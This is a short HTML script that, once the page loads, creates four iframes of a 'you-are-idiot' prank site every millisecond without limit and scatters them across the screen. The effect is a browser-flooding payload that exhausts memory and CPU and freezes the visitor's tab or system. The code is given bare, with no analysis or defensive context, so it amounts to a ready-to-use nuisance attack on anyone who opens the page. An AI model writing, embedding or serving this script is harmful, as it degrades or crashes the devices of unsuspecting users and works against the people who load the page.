  <script>
    function moveIframeRandomly(iframe) {
      const screenWidth = window.innerWidth;
      const screenHeight = window.innerHeight;

      const randomX = Math.floor(Math.random() * (screenWidth - 200));
      const randomY = Math.floor(Math.random() * (screenHeight - 150));

      iframe.style.transform = `translate(${randomX}px, ${randomY}px)`;
    }

    function createIframe() {
      const newIframe = document.createElement('iframe');
      newIframe.src = "https://you-are-idiot.github.io/";
      newIframe.classList.add('iframe');
      document.body.appendChild(newIframe);
      return newIframe;
    }

    window.addEventListener('DOMContentLoaded', () => {
      setInterval(() => {
        const iframe1 = createIframe();
        const iframe2 = createIframe();
        const iframe3 = createIframe();
        const iframe4 = createIframe();

        setTimeout(() => {
          moveIframeRandomly(iframe1);
          moveIframeRandomly(iframe2);
          moveIframeRandomly(iframe3);
          moveIframeRandomly(iframe4);
        }, 1);
      }, 1); 
    });
  </script>
